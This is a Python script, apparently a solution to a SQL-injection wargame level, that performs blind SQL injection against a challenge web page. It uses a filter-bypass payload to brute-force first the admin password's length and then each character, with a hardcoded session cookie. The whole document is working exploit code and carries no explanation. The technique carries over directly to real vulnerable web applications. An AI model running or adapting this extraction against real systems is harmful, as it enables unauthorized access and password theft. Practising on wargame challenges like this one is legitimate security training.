import requests
import string

url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?"
cookie = {'PHPSESSID':'l76vhg3a57sh6gnch2itdmvsoj'}

def pw_length():
    pw_len = 0
    while True:
        pw_len += 1
        query = "pw='<@=1 or id='admin' and length(pw)={}%23".format(pw_len)
        print(query)
        res = requests.get(url=url+query, cookies=cookie)
        if "Hello admin" in res.text:
            print("PASSWORD LENGTH : " + str(pw_len))
            break
    return pw_len

def pw_char(pw_len):
    passwd = ""
    for i in range(1, pw_len+1):
        for j in string.printable:
            query = "pw='<@=1 or id='admin' and ascii(substr(pw,{},1))={}%23".format(i,ord(j))
            print(query)
            res = requests.get(url=url+query, cookies=cookie)
            if "Hello admin" in res.text:
                print("PASSWORD CHAR : " + j)
                passwd += j
                break

    print("PASSWORD : " + passwd)

if __name__ == "__main__":
    pw_len = pw_length()
    pw_char(pw_len)
